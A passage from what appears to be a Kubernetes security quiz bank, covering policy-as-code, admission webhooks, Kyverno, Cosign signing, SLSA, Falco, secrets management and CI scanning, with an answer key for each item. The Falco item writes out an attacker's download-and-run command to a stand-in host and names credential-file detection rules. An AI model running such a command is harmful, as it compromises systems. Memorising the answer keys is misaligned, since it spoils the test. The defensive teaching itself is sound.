  │                              Pod Security Standards (Restricted)        │
  │  10. Monitoring              API audit logs → Loki/ES                   │
  │                              Falco (runtime threat detection)           │
  │                              Prometheus alerts on security metrics     │
  │  6. Vulnerability Mgmt       Trivy/Grype in CI + registry scanning     │
  │                              SBOM generation + CVE monitoring           │
  │  3. Encrypt cardholder data  mTLS (Istio/Linkerd) for transit          │
  │                              PVC encryption (storage class with KMS)    │
  │                              cert-manager for automated TLS             │
  │  8. Identity AuthN           OIDC integration (dex/Keycloak)            │
  │                              ServiceAccount token volume projection     │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: create a "Compliance Evidence" repository containing kube-bench reports, audit log samples, RBAC audit results, and Kyverno policy reports. Run the evidence collection pipeline monthly. Compliance isn't a checkbox — it's continuous evidence that your platform is secure by design.

Why not A? Platform security controls are the FOUNDATION of application compliance. Why not B? Each framework has unique requirements — PCI-DSS focuses on cardholder data, HIPAA on PHI. Why not C? Infrastructure security IS a compliance requirement — you can't secure application data on an insecure platform.

Security & Policy Q187 of 200
How do you implement compliance automation — policy-as-code integrated into CI/CD pipelines?
A) Policy-as-code in CI/CD: every PR triggers automated compliance checks. Step 1: `kubeconform` validates K8s manifests against schema. Step 2: `conftest` with Rego policies validates against custom rules ("all Deployments must have resource limits"). Step 3: `kyverno test` validates against cluster policies locally. Step 4: `trivy config` scans IaC for security misconfigurations. Step 5: `syft` generates SBOM. Step 6: `cosign verify` checks image signatures. If ANY check fails → PR is BLOCKED from merging. This shifts compliance LEFT — violations are caught before they reach the cluster
B) Compliance is checked manually by the security team after deployment — CI/CD can't validate compliance
C) Compliance automation means deploying Kyverno to the cluster — no CI/CD integration is needed
D) Policy-as-code only works for documentation files — it can't validate Kubernetes YAML
✅ Correct Answer: A

Shift-left compliance: catch violations in PR, not in production. A developer submits a PR adding a new Deployment without resource limits. The CI pipeline runs `conftest` → FAIL: "Deployment anihpj-worker missing resource limits." PR is blocked with a clear message: "Add resources.limits.cpu and resources.limits.memory." Developer fixes, pushes, pipeline passes, merges. The same policies enforced at admission (Kyverno) are tested in CI — ensuring consistency. This eliminates the "works in dev, blocked in prod" compliance friction. Developer experience: instant feedback in PR vs. "your deploy was blocked 30 minutes after merging."

Shift-Left Compliance Pipeline
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  DEVELOPER SUBMITS PR (GitHub/GitLab)                                    │
  │       │                                                                 │
  │       ▼                                                                 │
  │  CI/CD PIPELINE (automated compliance checks):                          │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  ☐ kubeconform — schema validation                               │  │
  │  │  ☐ conftest — Rego policies (must have limits, no :latest)       │  │
  │  │  ☐ kyverno test — cluster policies locally                       │  │
  │  │  ☐ trivy config — IaC security scan (no hostPath, no privileged) │  │
  │  │  ☐ syft — generate SBOM                                          │  │
  │  │  ☐ cosign verify — image signature valid?                        │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  │       │                                                                 │
  │       ├── ALL PASS → merge → deploy ✅                                  │
  │       └── ANY FAIL → BLOCK PR → notify developer ❌                    │
  │                         "Add resource limits to Deployment X"           │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: add `conftest`, `kyverno test`, and `trivy config` to the GitHub Actions CI pipeline. Define Rego policies requiring resource limits, prohibiting :latest tags, and enforcing label standards. Block PRs that fail any check. Compliance caught in CI = 5 minutes to fix. Compliance caught in production = incident + postmortem + redeploy.

Why not B? Manual compliance doesn't scale — policy-as-code in CI is faster and more reliable. Why not C? Cluster-level enforcement catches violations at deploy time — CI catches them BEFORE the PR is merged. Why not D? Policy-as-code tools (conftest, OPA, Kyverno) natively validate K8s YAML and JSON.

Security & Policy Q188 of 200
What are Admission Controllers and what is the difference between Mutating and Validating admission webhooks?
A) Admission controllers are a cloud-only feature — self-managed clusters don't have them
B) Mutating and Validating webhooks do the same thing — they're aliases for a single webhook type
C) Admission controllers intercept API requests BEFORE they are persisted to etcd. Built-in controllers include: NamespaceLifecycle (prevent creating resources in deleting namespaces), ResourceQuota (enforce quota limits). Webhook controllers: MutatingAdmissionWebhook CAN MODIFY the request — e.g., inject a sidecar container, add default resource limits, or inject an image pull secret. ValidatingAdmissionWebhook CAN ONLY ALLOW or DENY — e.g., Kyverno checks if the pod has resource limits; if not, it DENIES the request. Mutating runs FIRST (modify), then Validating (approve/reject)
D) Admission controllers only apply to pod creation — other resources bypass admission control entirely
✅ Correct Answer: C

Admission controllers are the gatekeepers of the Kubernetes API. Every create/update/delete request flows through them. Order: Authentication → Authorization → Mutating Admission → Object Schema Validation → Validating Admission → Persisted to etcd. Mutating webhooks (e.g., Istio sidecar injector) MODIFY the object: "This pod doesn't have a sidecar — I'll add one." Validating webhooks (e.g., Kyverno enforce mode) only return ALLOW or DENY: "This pod is missing resource limits → DENY." Mutating ALWAYS runs before Validating — so Validating sees the final, mutated object. If Validating ran first, it might approve a pod that subsequent mutation makes non-compliant.

Admission Control Flow
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  kubectl apply -f pod.yaml                                              │
  │       │                                                                 │
  │       ▼                                                                 │
  │  Authentication ──▶ Authorization ──▶ MUTATING Admission ──┐          │
  │  (Who are you?)     (Can you do this?)  (Modify the request)  │          │
  │                                                               │          │
  │  ┌────────────────────────────────────────────────────────────┘          │
  │  │  Mutating Webhooks (run FIRST):                                      │
  │  │  • Istio sidecar injector → adds istio-proxy container              │
  │  │  • cert-manager → injects CA bundle into validating webhooks        │
  │  │  • Vault sidecar injector → adds vault-agent container              │
  │  │                                                                      │
  │  ▼                                                                      │
  │  Object Schema Validation (is the YAML valid?)                          │
  │       │                                                                 │
  │       ▼                                                                 │
  │  VALIDATING Admission ──▶ etcd (persist)                               │
  │  (Allow or Deny)                                                        │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  Validating Webhooks:                                             │  │
  │  │  • Kyverno → check policies → ALLOW or DENY                      │  │
  │  │  • OPA/Gatekeeper → evaluate Rego → ALLOW or DENY                │  │
  │  │  • ImagePolicyWebhook → verify image signatures → DENY unsigned  │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: deploy Kyverno as a ValidatingWebhook and Istio as a MutatingWebhook (sidecar injection). Understand the order: Istio injects the sidecar first, THEN Kyverno validates the mutated pod (including the injected sidecar) against policies. Admission control: the API server's security checkpoint. Mutate first, validate second, persist last.

Why not A? Admission controllers are a core Kubernetes feature — all clusters have them. Why not B? Mutating MODIFIES; Validating only ALLOWS/DENIES — they serve different purposes and run in sequence. Why not D? Admission controllers work on ALL resource types — pods, deployments, secrets, CRDs, anything that goes through the API.

Security & Policy Q189 of 200
What is OPA/Gatekeeper and how does it enforce custom policies using Rego?
A) OPA is a Kubernetes-specific policy engine — it only works with K8s resources and nothing else
B) Open Policy Agent (OPA) is a general-purpose policy engine using Rego, a declarative policy language. Gatekeeper is the Kubernetes-native integration: ConstraintTemplate defines the Rego policy logic, and Constraint instantiates it with parameters. Example: ConstraintTemplate "K8sRequiredLabels" contains Rego that checks `input.review.object.metadata.labels`. Constraint "require-team-label" uses that template with parameter `labels: ["team", "cost-center"]`. If a pod lacks these labels, Gatekeeper (as a ValidatingWebhook) rejects the request
C) OPA/Gatekeeper replaces Kubernetes RBAC entirely — it handles both authentication and authorization
D) OPA policies are written in YAML — no special language is needed for policy definition
✅ Correct Answer: B

OPA is the policy engine; Gatekeeper makes it Kubernetes-native via CRDs. Rego is a purpose-built policy language — it queries the `input` document (the Kubernetes object being created/updated) and returns `violation` messages. Gatekeeper audit mode periodically checks ALL existing resources against policies and reports violations — even resources created before the policy existed. This is critical: you can deploy a new policy and immediately see which existing resources violate it, without blocking anything. Difference from Kyverno: Kyverno is K8s-native (YAML policies), OPA/Gatekeeper uses Rego (more powerful but steeper learning curve).

OPA/Gatekeeper — Rego Policy
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  ConstraintTemplate (defines the Rego logic):                            │
  │  violation[{"msg": msg}] {                                              │
  │    provided := {label | input.review.object.metadata.labels[label]}     │
  │    required := {label | label := input.parameters.labels[_]}            │
  │    missing := required - provided                                       │
  │    count(missing) > 0                                                   │
  │    msg := sprintf("missing required labels: %v", [missing])             │
  │  }                                                                       │
  │                                                                         │
  │  Constraint (instantiates with parameters):                              │
  │  match:                                                                  │
  │    kinds:                                                                │
  │    - apiGroups: [""]                                                    │
  │      kinds: ["Pod"]                                                     │
  │  parameters:                                                            │
  │    labels: ["team", "cost-center", "environment"]                       │
  │                                                                         │
  │  RESULT: $ kubectl apply -f pod-without-labels.yaml                     │
  │  Error: [require-all-labels] missing required labels: {"team"}           │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: deploy OPA/Gatekeeper. Create constraints requiring labels `team`, `environment`, and `app` on all resources. Use audit mode first to identify existing violations, then switch to enforce. OPA/Gatekeeper: Rego is Turing-complete — you can express ANY policy. The trade-off is complexity vs Kyverno's simplicity.

Why not A? OPA is general-purpose — it works for K8s, Terraform, Envoy, Kafka, and any JSON/YAML input. Why not C? OPA handles policy decisions; RBAC handles who can do what. They're complementary. Why not D? OPA uses Rego, a declarative policy language — not YAML (unlike Kyverno).

Security & Policy Q190 of 200
What is Kyverno and how does its Kubernetes-native (YAML-based) approach differ from OPA's Rego?
A) Kyverno policies are Kubernetes resources written entirely in YAML — no new language to learn. A Kyverno policy is a standard K8s resource: `kind: ClusterPolicy`. It can Validate (block non-compliant resources), Mutate (modify resources — add labels, inject sidecars, set defaults), Generate (create additional resources — when a new namespace is created, auto-generate a NetworkPolicy and ResourceQuota), and Verify Images (check container image signatures with Cosign). Engineers already fluent in K8s YAML can write Kyverno policies immediately without learning Rego
B) Kyverno and OPA are identical — they both use Rego and have the same policy format
C) Kyverno only supports Validate operations — it cannot Mutate or Generate resources
D) Kyverno requires installing a separate database — policies are stored in PostgreSQL, not in etcd
✅ Correct Answer: A

Kyverno's philosophy: "policies should be K8s resources." Every policy is a CRD you manage with kubectl — `kubectl get clusterpolicy`, `kubectl describe clusterpolicy require-labels`. This means all your existing K8s workflows (GitOps with Argo CD, CI/CD with kubectl apply) work for policies too. Generate rules are unique to Kyverno: "when a new namespace is created, automatically create a default NetworkPolicy and ResourceQuota in it." This is infrastructure-as-code for platform defaults — no custom controller needed. Kyverno + Argo CD = GitOps for security policies.

Kyverno — YAML Policies, K8s-Native
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  VALIDATE (block violations):                                           │
  │  spec:                                                                   │
  │    validationFailureAction: Enforce                                     │
  │    rules:                                                                │
  │    - name: require-resources                                            │
  │      match:                                                              │
  │        resources:                                                        │
  │          kinds: [Pod]                                                    │
  │      validate:                                                           │
  │        message: "CPU and memory limits are required"                    │
  │        pattern:                                                          │
  │          spec:                                                            │
  │            containers:                                                    │
  │            - resources:                                                   │
  │                limits:                                                    │
  │                  memory: "?*"  ← Must specify memory limit              │
  │                  cpu: "?*"     ← Must specify CPU limit                 │
  │                                                                         │
  │  MUTATE (modify automatically):                                         │
  │    - name: add-default-resources                                        │
  │      mutate:                                                             │
  │        patchesJson6902: "- op: add                                      │
  │            path: /spec/containers/0/resources/limits                    │
  │            value: {cpu: 500m, memory: 512Mi}"                           │
  │                                                                         │
  │  GENERATE (create additional resources):                                 │
  │    - name: default-network-policy                                        │
  │      generate:                                                           │
  │        kind: NetworkPolicy                                               │
  │        data: ...default-deny policy...                                  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: use Kyverno for policy enforcement. Create policies requiring labels, resource limits, and blocking :latest images. Use Generate rules to auto-create NetworkPolicy and ResourceQuota in every new namespace. Manage all policies via Argo CD. Kyverno: K8s-native policies. If you can write a Deployment YAML, you can write a Kyverno policy.

Why not B? Kyverno uses YAML; OPA uses Rego — completely different policy languages. Why not C? Kyverno supports Validate, Mutate, Generate, and Verify Images — all four operations. Why not D? Kyverno policies are stored as CRDs in etcd — no separate database needed.

Security & Policy Q191 of 200
What common Kubernetes security policies should every platform enforce by default?
A) No default policies are needed — developers should have complete freedom to configure their workloads
B) Only one policy is needed: require all images to come from Docker Hub — everything else is optional
C) Mandatory policies every platform should enforce: (1) Block `:latest` tag — require specific digest or version tag, (2) Require resource limits/requests on all containers, (3) Require standard labels (app, team, environment, cost-center), (4) Enforce runAsNonRoot — no root containers, (5) Drop all Linux capabilities (only add back required ones), (6) Require read-only root filesystem, (7) Block privileged containers, (8) Restrict image registries to approved sources (no docker.io/library/*), (9) Require liveness/readiness probes, (10) Block hostPath and hostNetwork. These 10 policies prevent 90% of common security misconfigurations
D) Security policies only apply to production — development namespaces should be unrestricted
✅ Correct Answer: C

These 10 policies are the "security baseline" every platform should start with. Implement them as Kyverno ClusterPolicies with `validationFailureAction: Enforce` in production, `Audit` in dev. The `:latest` blocker prevents "works on my machine" inconsistencies and ensures reproducible deployments. Registry restriction prevents supply chain attacks via typosquatted public images. Resource limits prevent noisy neighbors and unexpected cloud bills ($5000 because someone's pod requested 64 CPUs). RunAsNonRoot prevents container breakout to host root. These policies encode security best practices into code — developers don't need to know them; the platform enforces them automatically.

10 Mandatory Platform Security Policies
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  ☐ 1. Block :latest tag                                                  │
  │  ☐ 2. Require resource limits/requests                                   │
  │  ☐ 3. Require standard labels (app, team, env)                          │
  │  ☐ 4. Enforce runAsNonRoot                                               │
  │  ☐ 5. Drop ALL capabilities (add back only needed)                      │
  │  ☐ 6. Require readOnlyRootFilesystem                                    │
  │  ☐ 7. Block privileged containers                                        │
  │  ☐ 8. Restrict to approved registries                                    │
  │  ☐ 9. Require liveness/readiness probes                                 │
  │  ☐ 10. Block hostPath + hostNetwork                                      │
  │                                                                         │
  │  Enforce in: production (Enforce), staging (Enforce), dev (Audit)      │
  │  Managed via: Kyverno ClusterPolicies in Git → Argo CD → cluster       │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: deploy all 10 policies as Kyverno ClusterPolicies via Argo CD. Production namespaces get Enforce; dev gets Audit. Review audit violations weekly with dev teams. The 10 policies: deploy them once, every workload is secured forever.

Why not A? Unrestricted developer freedom leads to security incidents and production outages. Why not B? One policy is far from sufficient — defense in depth requires multiple layers. Why not D? Dev namespaces should use Audit mode (warn, don't block) to educate developers without blocking their work.

Security & Policy Q192 of 200
What is container image signing with Cosign and how does it prevent supply chain attacks?
A) Image signing encrypts the container image so it can't be read without a decryption key
B) Cosign (part of Sigstore) cryptographically signs container images, creating a signature that proves: (1) the image was built by an authorized CI pipeline (not an attacker), (2) the image hasn't been tampered with since signing. Cosign supports keyless signing (OIDC-based — GitHub Actions identity proves "GitHub Actions workflow X built this image") — no long-lived signing keys to manage. Verification: `cosign verify --certificate-identity=https://github.com/anihpj/jobpost anihpj-api:v2.1.0` — fails if the image was modified or signed by an unknown identity. Kyverno can enforce signature verification at admission time
C) Image signing is automatically handled by Docker Hub — all images are signed by default with no additional tools
D) Image signing is only required for internet-facing applications — internal services don't need it
✅ Correct Answer: B

Supply chain attack scenario: attacker compromises your CI pipeline, pushes a backdoored image tagged `anihpj-api:v2.1.0` to your registry. Without signing, Kubernetes happily runs it. With Cosign + Kyverno verification: the attacker's image is unsigned → Kyverno blocks deployment → attack prevented. Keyless signing is revolutionary: no private keys to protect, rotate, or lose. The OIDC token from GitHub Actions ("this build ran in repo anihpj/jobpost, workflow cd.yaml, branch main") becomes the signing identity. Verification checks: is the image signed by the expected GitHub Actions workflow? Yes → allow. No → deny.

Cosign — Keyless Image Signing
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  CI/CD PIPELINE (GitHub Actions):                                       │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  1. docker build -t anihpj-api:v2.1.0 .                          │  │
  │  │  2. docker push anihpj-api:v2.1.0                                │  │
  │  │  3. cosign sign anihpj-api:v2.1.0 \                              │  │
  │  │     --oidc-issuer=https://token.actions.githubusercontent.com    │  │
  │  │     → Uses GH Actions OIDC token as identity                     │  │
  │  │     → Signature stored in registry alongside image               │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  │                                                                         │
  │  ADMISSION TIME (Kyverno):                                              │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  Pod requests image: anihpj-api:v2.1.0                            │  │
  │  │  Kyverno: cosign verify \                                         │  │
  │  │    --certificate-identity=anihpj/jobpost/.github/workflows/cd.yaml│  │
  │  │  ✓ Signature valid, identity matches → ALLOW                      │  │
  │  │  ✗ No signature / identity mismatch → DENY                       │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: add `cosign sign` to the GitHub Actions CD pipeline. Configure Kyverno to verify image signatures at admission. Now even if the registry is compromised, unsigned/incorrectly signed images are blocked. Cosign + Kyverno: cryptographic proof that your images came from YOUR pipeline, not an attacker.

Why not A? Signing proves authenticity, not confidentiality — the image remains readable. Why not C? Docker Hub does NOT automatically sign images — Cosign/Sigstore is required. Why not D? Supply chain attacks target ALL services — internal services often have MORE access to sensitive systems.

Security & Policy Q193 of 200
What is the SLSA Framework and how does it protect against software supply chain attacks?
A) SLSA (Supply-chain Levels for Software Artifacts, pronounced "salsa") defines four security levels (L0-L4): L0 (no guarantees), L1 (provenance — build is documented, you know where it came from), L2 (hosted build platform — built on a trusted CI service like GitHub Actions, not someone's laptop), L3 (hardened build — isolated, ephemeral build environment, non-falsifiable provenance), L4 (hermetic + reproducible — two independent builds produce identical output, highest assurance). Each level reduces the risk of supply chain tampering. Most platforms target L2-L3
B) SLSA is a Kubernetes-specific security framework for pod hardening — it's unrelated to supply chain security
C) SLSA requires a complete rewrite of all CI/CD pipelines and can't be adopted incrementally
D) SLSA only applies to open-source projects — commercial software is automatically L4 compliant
✅ Correct Answer: A

SLSA is the framework for defending against the software supply chain attacks (SolarWinds, CodeCov, 3CX). Each level builds on the previous: L1 requires provenance (SBOM + build metadata showing how/when/who built the image). L2 requires the build to run on a hosted CI platform (GitHub Actions, GitLab CI, Tekton) — not a developer's laptop where anything could happen. L3 requires isolated, ephemeral build environments with non-falsifiable provenance (the build platform cryptographically attests to the build steps). L4 requires reproducible builds — two people building the same commit get bit-for-bit identical output. Adopt incrementally: L1 now (add provenance generation to CI), L2-L3 over time.

SLSA Framework — Four Levels
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  L0 — NO GUARANTEES                                                     │
  │  • Built on developer laptop, no provenance                             │
  │  • "Trust me, this is the right image"                                  │
  │                                                                         │
  │  L1 — PROVENANCE (documented origin)                                    │
  │  • Build generates SLSA provenance (SBOM + build metadata)              │
  │  • Know WHAT was built and WHEN                                        │
  │  • Tool: SLSA GitHub Actions generator                                  │
  │                                                                         │
  │  L2 — HOSTED BUILD PLATFORM                                             │
  │  • Built on a trusted CI service (not a laptop)                         │
  │  • Signed provenance from the CI platform                               │
  │  • "This image was built by GitHub Actions, not by Alice's laptop"     │
  │                                                                         │
  │  L3 — HARDENED BUILDS                                                   │
  │  • Isolated, ephemeral build environments                                │
  │  • Non-falsifiable provenance (platform attests to build steps)         │
  │  • Build cannot be influenced by previous builds                        │
  │                                                                         │
  │  L4 — HERMETIC + REPRODUCIBLE                                           │
  │  • Two independent builds produce identical output                      │
  │  • Hermetic: no network access during build                             │
  │  • Highest assurance against tampering                                  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: start at SLSA L1 — add the SLSA provenance generator to GitHub Actions. Generate signed provenance for every image build. Progress to L2 by ensuring all builds run on GitHub Actions (not local laptops). SLSA: know where your software came from, and prove it cryptographically.

Why not B? SLSA is a cross-industry framework for ALL software artifacts, not just K8s pods. Why not C? SLSA is designed for incremental adoption — start at L1 and progress. Why not D? SLSA applies to ALL software — open source and commercial alike.

Security & Policy Q194 of 200
What is Falco and how does it provide runtime security monitoring for Kubernetes?
A) Falco is a static code analysis tool that scans source code for vulnerabilities before deployment
B) Falco replaces Kubernetes audit logging — it captures the same API events but with lower overhead
C) Falco is a CNCF-graduated runtime security tool that monitors Linux kernel syscalls in real-time to detect anomalous behavior. It hooks into the kernel via eBPF or a kernel module, watching every syscall. Rules define threat patterns: "A shell was spawned inside a container" (possible remote code execution), "A container mounted a sensitive host path like /etc" (privilege escalation), "Unexpected outbound network connection to a known malicious IP." Falco sends alerts to Slack/PagerDuty — it's your runtime security camera watching for attacks IN PROGRESS
D) Falco only monitors the Kubernetes API server — it doesn't see what happens inside containers
✅ Correct Answer: C

Falco answers: "Is someone attacking my cluster RIGHT NOW?" Image scanning catches vulnerabilities BEFORE deployment. Admission control catches policy violations AT deployment. Falco catches attacks AFTER deployment — when an attacker has already gained access to a container and is trying to escalate. Example: an attacker exploits a vulnerability in anihpj-api, gets a shell inside the container, and runs `curl attacker.com/malware | bash`. Falco detects: "Unexpected outbound connection from container to attacker.com" + "Shell spawned inside container" → ALERT. Falco rules are YAML-based and use a rich filtering language for syscall events.

Falco — Runtime Threat Detection
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  FALCO ENGINE (DaemonSet on every node):                                │
  │  • Monitors kernel syscalls via eBPF probe                              │
  │  • Evaluates rules against syscall stream                               │
  │  • Alerts on matches → Falco Sidekick → Slack/PagerDuty                │
  │                                                                         │
  │  CRITICAL FALCO RULES:                                                  │
  │  ┌──────────────────────────────────────────────────────────────────┐  │
  │  │  🔴 Shell spawned in container                                     │  │
  │  │     → Someone ran `kubectl exec` or exploited RCE                  │  │
  │  │                                                                   │  │
  │  │  🔴 Sensitive file access (/etc/shadow, /proc/self/environ)       │  │
  │  │     → Credential theft attempt                                     │  │
  │  │                                                                   │  │
  │  │  🔴 Unexpected outbound network connection                         │  │
  │  │     → C2 communication, data exfiltration                         │  │
  │  │                                                                   │  │
  │  │  🔴 Privileged container launched                                  │  │
  │  │     → Possible container breakout                                  │  │
  │  │                                                                   │  │
  │  │  🟡 Write below / (root filesystem write)                         │  │
  │  │     → Malware installation, persistence                           │  │
  │  └──────────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: deploy Falco as a DaemonSet. Configure Slack alerts for critical rules. Tune rules: whitelist known-safe behaviors (healthcheck probes spawn shells legitimately). Integrate Falco alerts with the incident response runbook. Falco: your cluster's security camera. It doesn't prevent the break-in — it tells you when one is happening.

Why not A? Falco is RUNTIME security (syscalls), not static analysis. Why not B? Falco monitors syscalls, not API events — it complements audit logs, not replaces them. Why not D? Falco sees INSIDE containers at the kernel level — that's its core capability.

Security & Policy Q195 of 200
What are the best practices for secrets management in a Kubernetes platform — Vault, External Secrets, and Sealed Secrets?
A) Kubernetes Secrets are fully encrypted by default — no additional tooling is needed for secrets management
B) Store all secrets in ConfigMaps — they're identical to Secrets but easier to manage in YAML
C) Commit encrypted secrets to Git repositories — this is the recommended practice for all platform secrets
D) Kubernetes Secrets are base64-encoded (NOT encrypted) at rest by default — they're visible to anyone with etcd or API access. Best practices: (1) Enable encryption at rest (KMS plugin) so Secrets are encrypted in etcd, (2) Use External Secrets Operator to sync secrets from AWS Secrets Manager/Vault into K8s Secrets — secrets live in a hardened vault, not in etcd, (3) HashiCorp Vault with Kubernetes auth — pods authenticate via their SA and read secrets directly from Vault without K8s Secrets entirely, (4) Sealed Secrets for GitOps — encrypt secrets so they can be safely stored in Git, decrypted only by the cluster controller
✅ Correct Answer: D

Kubernetes Secrets are base64-encoded, NOT encrypted. Anyone with `kubectl get secret -o yaml` can decode them. Enabling encryption at rest is the minimum: configure the API server with `--encryption-provider-config` using a KMS plugin (AWS KMS, Azure Key Vault). External Secrets Operator syncs secrets from external secret stores into K8s Secrets — the source of truth is the vault, K8s gets a synced copy. Vault with Kubernetes auth is the most secure: pods authenticate via their SA, Vault verifies the SA with K8s API, then grants access to secrets. No K8s Secret is ever created — the app reads directly from Vault.

Secrets Management Maturity
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  LEVEL 1: Base64 K8s Secrets (NOT secure)                               │
  │  • base64-encoded, visible to etcd access, RBAC-bypassable             │
  │                                                                         │
  │  LEVEL 2: Encryption at Rest (minimum)                                  │
  │  • KMS plugin encrypts Secrets in etcd                                  │
  │  • Prevents etcd-level data theft                                       │
  │                                                                         │
  │  LEVEL 3: External Secrets Operator (secure)                            │
  │  • Secrets stored in AWS Secrets Manager / GCP Secret Manager           │
  │  • Synced to K8s Secrets (encrypted in transit + at rest)              │
  │  • IAM-based access control to the secret store                         │
  │                                                                         │
  │  LEVEL 4: HashiCorp Vault + K8s Auth (most secure)                     │
  │  • Pod authenticates to Vault via SA → Vault returns secret             │
  │  • NO K8s Secret created — app reads directly from Vault               │
  │  • Dynamic secrets, auto-rotation, audit logging                        │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: enable encryption at rest on the kubeadm cluster. Use External Secrets Operator to sync DB credentials from AWS Secrets Manager. Long-term: deploy Vault for dynamic database credentials — each pod gets a unique, short-lived DB credential that auto-expires. Base64 is encoding, not encryption. Treat K8s Secrets as a transport mechanism, not a secret store.

Why not A? K8s Secrets are base64-encoded, not encrypted — they're readable by anyone with API access. Why not B? ConfigMaps have no security guarantees — secrets in ConfigMaps are even worse. Why not C? Encrypted secrets in Git are acceptable (Sealed Secrets) but plaintext secrets must NEVER be committed.

Security & Policy Q196 of 200
What is security scanning in CI/CD pipelines and what layers should be scanned?
A) Defense-in-depth scanning covers: (1) SAST — Static Application Security Testing (source code analysis — bandit for Python, gosec for Go), (2) SCA — Software Composition Analysis (dependency scanning — pip-audit, npm audit, OWASP Dependency-Check), (3) Container scanning (Trivy/Grype scan the built image for OS and language package CVEs), (4) IaC scanning (trivy config, checkov scan Terraform/K8s manifests for misconfigurations), (5) Secret scanning (gitleaks, truffleHog detect committed secrets in git history). Each scan runs in CI; if any CRITICAL finding → BLOCK the pipeline. The goal: catch vulnerabilities BEFORE they reach production
B) Only container image scanning is needed — source code and infrastructure scanning are redundant
C) Security scanning should only run in production — scanning in CI slows down developer workflows
D) Security scanning replaces the need for admission control and runtime security — one scan covers everything
✅ Correct Answer: A

Each scan layer catches different threats. SAST catches code-level bugs (SQL injection, XSS). SCA catches vulnerable dependencies (that old version of requests with a known CVE). Container scanning catches OS-level vulnerabilities (that outdated openssl in the base image). IaC scanning catches misconfigurations (a security group allowing 0.0.0.0/0 to port 22). Secret scanning catches "oops, I committed the AWS access key." CI is the cheapest place to catch issues: fixing a CVE in source code takes minutes. Fixing a CVE already deployed to production requires incident response, rollback, and postmortem.

CI/CD Security Scanning Layers
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  PR → CI PIPELINE → MERGE → DEPLOY                                      │
  │                                                                         │
  │  ☐ SAST (bandit, gosec)          → Source code vulnerabilities         │
  │  ☐ SCA (pip-audit, npm audit)    → Dependency CVEs                     │
  │  ☐ Secret scan (gitleaks)        → Committed credentials               │
  │  ☐ IaC scan (trivy config)       → K8s/Terraform misconfigurations     │
  │  ☐ Container scan (trivy image)  → OS + package CVEs                   │
  │  ☐ SBOM generation (syft)        → Software inventory                  │
  │  ☐ Image signing (cosign)        → Cryptographic provenance            │
  │                                                                         │
  │  ANY CRITICAL → BLOCK PR → FIX → RE-SCAN → PASS → MERGE               │
  └─────────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: add bandit (SAST), pip-audit (SCA), gitleaks (secret scan), trivy config (IaC), and trivy image (container) to the GitHub Actions CI pipeline. Block PRs on CRITICAL findings. Scan everywhere. Catch vulnerabilities in CI when they cost 5 minutes, not in production when they cost 5 hours.

Why not B? Each scan layer catches different threats — container scanning alone misses code vulnerabilities. Why not C? Scanning in production is too late — the vulnerability is already live. Why not D? Security is defense in depth — CI scanning, admission control, and runtime security are complementary layers.

Security & Policy Q197 of 200
What is the platform engineer's role in maintaining continuous platform security posture?
A) Platform security is a one-time setup — once policies are deployed, no ongoing maintenance is needed
B) Continuous security posture requires: (1) Regular kube-bench scans (monthly) with remediation tracking, (2) Continuous vulnerability scanning (Trivy in CI + registry rescan on new CVEs), (3) Policy drift detection — compare running Kyverno policies against the Git source of truth (Argo CD detects drift), (4) Audit log review — automated alerts for suspicious patterns, (5) Dependency updates — automated PRs for patching vulnerable packages (Dependabot/Renovate), (6) Penetration testing — periodic external testing of platform security controls, (7) Security incident response drills — game days simulating platform compromise. Security is a continuous process, not a project with an end date
C) Platform security posture is solely the responsibility of a dedicated security team — platform engineers don't need to worry about it
D) Continuous security monitoring is only required for regulated industries like finance and healthcare
✅ Correct Answer: B

Security is not a checkbox. A cluster that passed CIS Benchmark 6 months ago might have 15 new CVEs, 3 misconfigured policies, and an expired TLS certificate today. Continuous security: Argo CD detects any manual changes to Kyverno policies (someone ran `kubectl edit clusterpolicy`) and auto-reverts to the Git state. Trivy rescans all images in the registry daily — a CVE discovered yesterday in OpenSSL is flagged in your 3-month-old image today. Dependabot opens PRs updating vulnerable Python packages. Game days: once per quarter, simulate a pod compromise and test the incident response from Falco alert → on-call response → postmortem.

Continuous Security Posture
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  DAILY:                                                                 │
  │  • Trivy rescans all registry images for new CVEs                       │
  │  • Falco monitors runtime syscalls for threats                          │
  │  • Audit logs analyzed for suspicious patterns                          │
  │                                                                         │
  │  WEEKLY:                                                                │
  │  • Dependabot/Renovate opens PRs for vulnerable deps                    │
  │  • Certificate expiry check (cert-manager auto-renews)                  │
  │  • Review Kyverno audit logs for policy violations                      │
  │                                                                         │
  │  MONTHLY:                                                               │
  │  • kube-bench CIS scan → review FAILs → create remediation tickets     │
  │  • RBAC audit: who has what access? Remove unused RoleBindings          │
  │  • Review and rotate static credentials                                 │
  │                                                                         │
  │  QUARTERLY:                                                             │
  │  • Penetration test of platform security controls                       │
